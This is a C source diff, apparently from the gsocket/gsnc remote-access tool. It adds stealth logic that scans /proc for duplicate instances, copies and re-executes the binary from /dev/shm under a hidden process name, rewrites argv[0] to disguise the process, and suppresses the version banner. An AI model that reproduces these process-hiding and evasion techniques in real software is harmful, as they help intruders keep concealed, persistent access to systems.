@@ -114,17 +114,172 @@ err:
 	return ret;
 }
 
+static int
+read_proc_argv1(char *dst, size_t sz, char *d_name) {
+	char fnbuf[64];
+	int err = -1;
+	char *end = dst + sz;
+	char *ptr = dst;
+
+	snprintf(fnbuf, sizeof fnbuf, "/proc/%.35s/cmdline", d_name);
+	FILE *fp = fopen(fnbuf, "rb");
+	dst[0] = '\0';
+	if (fp == NULL)
+		goto done;
+
+	if (fread(dst, 1, sz, fp) <= 0)
+		goto done;
+	dst[sz - 1] = '\0';
+
+	ptr = strchr(dst, '\0');
+	if (ptr == NULL)
+		goto done;
+	ptr++;
+	memmove(dst, ptr, end - ptr);
+	err = 0;
+
+done:
+	XFCLOSE(fp);
+	return err;
+}
+
+static int
+is_running(const char *fn_me, bool match_fullname, const char *argv0) {
+	DIR *d;
+	struct dirent *ent;
+	char dstexe[PATH_MAX];
+	int rv;
+	int fret = 0;
+	pid_t getpid();
+	char mypid[16];
+	struct stat sb;
+	uid_t uid = geteuid();
+	int is_deleted;
+	char *ptr;
+	char buf[64];
+
+	snprintf(mypid, sizeof mypid, "%d", getpid());
+
+	if ((d = opendir("/proc")) == NULL)
+		return -1;
+
+	DEBUGF("Checking %s, skipping myself [%s]\n", fn_me, mypid);
+	while ((ent = readdir(d)) != NULL) {
+		is_deleted = 0;
+		if (!((ent->d_name[0] >= '0') && (ent->d_name[0] <= '9')))
+			continue;
+		if (strcmp(ent->d_name, mypid) == 0) {
+			// DEBUGF("Skipping myself\n");
+			continue;
+		}
+		snprintf(buf, sizeof buf, "/proc/%.35s/exe", ent->d_name);
+		rv = readlink(buf, dstexe, sizeof dstexe);
+		if ((rv <= 0) || (rv >= sizeof dstexe))
+			continue; // Fail with -EPERM unless ROOT
+		if (uid == 0) {
+			// ROOT check that this is our UID.
+			if (lstat(buf, &sb) != 0)
+				continue;
+			if (sb.st_uid != 0)
+				continue; // gsnc started as different user (not ROOT while we are ROOT).
+		}
+		dstexe[rv] = '\0';
+		// Check if it does
+		if (lstat(dstexe, &sb) != 0) {
+			// Truly been deleted
+			is_deleted = 1;
+		} else {
+			// was marked as "(deleted)" but a sneaky user create "orig (deleted)" file.
+			ptr = dstexe;
+			ptr += strlen(dstexe);
+			ptr -= 10;
+			if (ptr > dstexe) {
+				if (memcmp(ptr, " (deleted)", 10) == 0)
+					is_deleted = 1;
+			}
+		}
+		if (is_deleted) {
+			// Remove the ' (deleted)' appendix
+			ptr = strrchr(dstexe, ' ');
+			if (ptr != NULL)
+					*ptr = '\0';
+		}
+		ptr = dstexe;
+		if (!match_fullname) {
+			ptr = strrchr(dstexe, '/');
+			if (ptr == NULL)
+				continue;
+			ptr++;
+		}
+		if (strcmp(ptr, fn_me) == 0) {
+			DEBUGF("We may already be running (found running %s)\n", ptr);
+			if (is_deleted) 
+				goto ok; // NAME matches and binary deleted. That's only us doing shit like that.
+			
+			if (argv0) {
+				// Maybe started from ld-linux.so (and failed to re-exec). Must also check argv1.
+				if (read_proc_argv1(dstexe, sizeof dstexe, ent->d_name) != 0)
+					continue;
+				
+				ptr = dstexe;
+				if ((ptr = strrchr(dstexe, '/')) != NULL)
+					ptr++;
+				if (strstr(argv0, ptr) != NULL)
+					goto ok;
+
+				continue;
+			}
+			// FIXME: Search /proc/<PID>/environ for GS_TOKEN (md5(GS_SECRET)) to make sure this GSNC
+			// is using the same GS_SECRET.
+			goto ok;
+		}
+	}
+
+	fret = 1; // NOT running
+ok:
+	DEBUGF("returns %d\n", fret);
+	closedir(d);
+	return fret;
+}
+
+// static void
+// waitln(void) {
+// 	char *ptr=NULL;
+// 	size_t sz;
+// 	getline(&ptr, &sz, stdin);
+// }
+
 static void
-try_changeargv0(char *argv[]) {
+try_changeargv0(int argc, char *argv[]) {
 	char *exename;
 	char *ptr;
+	char *ldso = NULL;
 #ifdef DEBUG
 	gopt.err_fp = stderr;
 #endif
 
 	if ((argv == NULL) || (argv[0] == NULL))
 		return;
+	// Note: argv0 points to the gsnc if started with ld-linux.so
+	// but /proc/self/cmdline shows as argv0 == /lib/ld-linux.so
 	exename = argv[0];
+
+	if ((ptr = GS_GETENV2("EXENAME")) != NULL)
+		exename = ptr;
+	else {
+		// Load from /proc - linux only. readlink() is faster but more complex to use.
+		ptr = realpath("/proc/self/exe", NULL /* with malloc */);
+		if (ptr != NULL) {
+			if (strstr(ptr, "ld-linux") == NULL)
+				exename = ptr; // NOT started with ld-linux.so. Update exename
+			else {
+				ldso = ptr; // exename remains argv[0]
+			}
+		}
+	}
+
+	// This can never happen:
+	XASSERT(strstr(exename, "ld-linux") == NULL, "Oops. Set GS_EXENAME= to binary file.");
 
 	if (GS_GETENV2("CONFIG_CHECK")) {
 		gopt.flags |= GSC_FL_CONFIG_CHECK;
@@ -150,16 +305,23 @@ try_changeargv0(char *argv[]) {
 		return;
 	}
 
-	ptr = realpath(exename, NULL /* will malloc */);
-	if (ptr == NULL) {
-		DEBUGF("exename not found [%s]\n", exename);
-		return;
+	// HERE: Try to execute US from /dev/shm or at least change argv0
+	// Find absolute path of our own binary
+	if (exename[0] != '/') {
+		ptr = realpath(exename, NULL /* will malloc */);
+		if (ptr == NULL) {
+			DEBUGF("exename not found [%s]\n", exename);
+			return;
+		}
+		exename = ptr;
 	}
-	exename = ptr;
 
-	// Load config
 	if (GSNC_config_read(exename) != 0) {
 		DEBUGF("GSNC_config_read() failed\n");
+		// MUST exit if GS_CONFIG_READ=0 is set or otherwise
+		// uname -a is started for every gsnc login
+		if ((!(gopt.flags & GSC_FL_WANT_CONFIG_READ)) && (getenv("GSNC") != NULL))
+			exit(0);
 		return;
 	}
 
@@ -168,17 +330,36 @@ try_changeargv0(char *argv[]) {
 		gopt.prg_exename = exename;
 		return;
 	}
+	// Check if already running as either exename or PROC_HIDDENNAME
+	// - Check actual binary /usr/sbin/supervise (in case /dev/shm re-execution failed)
+	// - Check if executed from /dev/shm as PROC_HIDDENNAME
+	// - might be started as with ld-linux.so and /dev/shm-reexec failed or succeeded (check both cases).
+	if (ldso) {
+		if (is_running(ldso, true, exename) == 0)
+			exit(EBUSY); // ld-linux & /dev/shm-rexec failed.
+	} else {
+		if (is_running(exename, true, NULL) == 0)
+			exit(EBUSY);
+	}
+
+	// /dev/shm-reexec succeeded (now /proc/self/exe is proc_hiddenname)
+	if (is_running(gopt.proc_hiddenname, false, NULL) == 0)
+		exit(EBUSY);
 
 	// First try to copy & execute myself as /dev/shm/PROC_HIDDENNAME
 	if (try_cpexecme(exename, argv) == 0)
 		return;
 
-	// Otherwise, modify my argv[0]
-	setenv("_GS_PROC_EXENAME", exename, 1);
-	argv[0] = gopt.proc_hiddenname;
-	execv(exename, argv);
-	DEBUGF("execv()=%s\n", strerror(errno));
-	// Silently ignore. Continue with current argv0 name.
+	// No point to change argv0 is started via ld-linux because it will show binary as argv1 anyway.
+	if (ldso == NULL) {
+		// Otherwise, modify my argv[0]
+		setenv("_GS_PROC_EXENAME", exename, 1);
+		argv[0] = gopt.proc_hiddenname;
+
+		execv(exename, argv);
+		DEBUGF("execv()=%s\n", strerror(errno));
+	}
+	// Re-Execution not possible. Continue with current argv0 name.
 }
 
 static int
@@ -233,7 +414,7 @@ do_util_test_changecgroup(void) {
 }
 
 void
-init_defaults1(char *argv[]) {
+init_defaults1(int argc, char *argv[]) {
 	char *argv0 = argv[0];
 	char *ptr;
 #ifdef DEBUG
@@ -248,11 +429,14 @@ init_defaults1(char *argv[]) {
 		if (*ptr == '0')
 			gopt.flags &= ~GSC_FL_IS_STEALTH;
 	}
+	if (!(gopt.flags & GSC_FL_IS_STEALTH))
+		return;
+
 	ptr = GS_GETENV2("CONFIG_READ");
     if ((ptr == NULL) || (*ptr != '0'))
 		gopt.flags |= GSC_FL_WANT_CONFIG_READ;
 	
-	try_changeargv0(argv); // If wanted, calls GSNC_config_read()
+	try_changeargv0(argc, argv); // If wanted, calls GSNC_config_read()
 	if (gopt.flags & GSC_FL_CONFIG_CHECK)
 		return;
 
@@ -316,7 +500,7 @@ init_defaults2(int argc, int *argcptr, char **argvptr[])
 
 void
 init_defaults(int argc, int *argcptr, char **argvptr[]) {
-	init_defaults1(*argvptr);
+	init_defaults1(argc, *argvptr);
 	init_defaults2(argc, argcptr, argvptr);
 }
 
@@ -495,7 +679,8 @@ init_vars(void)
 void
 usage(const char *params)
 {
-	fprintf(stderr, "Version %s%s, %s %s [%s]\n", PACKAGE_VERSION, gopt.is_built_debug?"#debug":"", __DATE__, __TIME__, OPENSSL_VERSION_TEXT);
+	if (!(gopt.flags & GSC_FL_IS_STEALTH))
+		fprintf(stderr, "Version %s%s, %s %s [%s]\n", PACKAGE_VERSION, gopt.is_built_debug?"#debug":"", __DATE__, __TIME__, OPENSSL_VERSION_TEXT);
 
 #ifndef STEALTH
 	while (*params)
